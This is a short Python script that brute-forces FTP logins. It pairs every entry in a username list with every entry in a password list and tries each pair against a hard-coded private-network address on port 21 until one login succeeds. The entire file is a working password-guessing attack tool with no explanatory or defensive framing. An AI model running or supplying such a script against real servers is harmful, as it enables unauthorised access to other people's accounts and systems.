from ftplib import FTP 

#f = open('dictionary.txt', 'r').read()
#bag = [i.split(':') for i in f.split('\n')]

# For independent Username, Password word lists, uncomment below lines and comment above ones

du = open('user.txt', 'r').read().split('\n')
dp = open('pass.txt', 'r').read().split('\n')

bag = [[i, j] for i in du for j in dp]

for i in bag:
    try:
        print('Trying...')
        ftp = FTP()
        ftp.connect('192.168.43.92', 21)
        print(i)
        ftp.login(i[0], i[1])
        print('>>>>>>>>>>>>>>>>Login Successful!<<<<<<<<<<<<<<')
        break
    except Exception as e:
        print('Error!')
        print(e)
        continue
